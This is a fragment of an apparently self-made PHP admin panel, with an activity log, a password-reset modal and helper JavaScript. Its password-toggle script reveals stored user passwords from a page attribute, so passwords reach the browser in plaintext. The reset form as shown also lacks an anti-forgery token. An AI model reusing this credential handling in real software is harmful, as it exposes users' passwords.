        <span class="log-act <?php echo $aClass; ?>"><?php echo h($action); ?></span>
        <?php if ($detail): ?>
          <span class="log-detail"><?php echo h($detail); ?></span>
        <?php endif; ?>
      </div>
      <?php endforeach; ?>
    <?php endif; ?>
  </div>
</div>

<?php endif; ?>
</main>

<!-- ── RESET PASSWORD MODAL ── -->
<div class="modal-overlay" id="resetModal">
  <div class="modal">
    <h3>🔄 Reset Password</h3>
    <p id="resetModalSub">Set a new password for this user.</p>
    <form method="post" id="resetForm">
      <input type="hidden" name="action" value="reset_password">
      <input type="hidden" name="target" id="resetTarget">
      <div class="fg" style="margin-bottom:12px">
        <label>New Password (min 6 chars)</label>
        <input type="text" name="newpass" id="resetPassInput" required minlength="6"
               placeholder="Enter new password" autocomplete="off">
      </div>
      <div class="actions">
        <button type="button" class="btn btn-ghost" onclick="closeReset()">Cancel</button>
        <button type="submit" class="btn btn-primary">✔ Set Password</button>
      </div>
    </form>
  </div>
</div>

<script>
// Toggle password visibility
function togglePw(idx) {
  const el = document.getElementById('pw-' + idx);
  if (!el) return;
  if (el.style.filter === 'none') {
    el.style.filter = 'blur(4px)';
    el.textContent  = '●'.repeat(el.dataset.val.length);
  } else {
    el.style.filter = 'none';
    el.textContent  = el.dataset.val;
  }
}

// Accordion
function toggleAccord(head) {
  const body = head.nextElementSibling;
  head.classList.toggle('open');
  body.classList.toggle('open');
}

// Reset Password Modal
function openReset(username) {
  document.getElementById('resetTarget').value  = username;
  document.getElementById('resetModalSub').textContent = 'Set a new password for: ' + username;
  document.getElementById('resetPassInput').value = '';
  document.getElementById('resetModal').classList.add('open');
}
function closeReset() {
  document.getElementById('resetModal').classList.remove('open');
}
document.getElementById('resetModal').addEventListener('click', function(e) {
  if (e.target === this) closeReset();
});
</script>
</body>
</html>
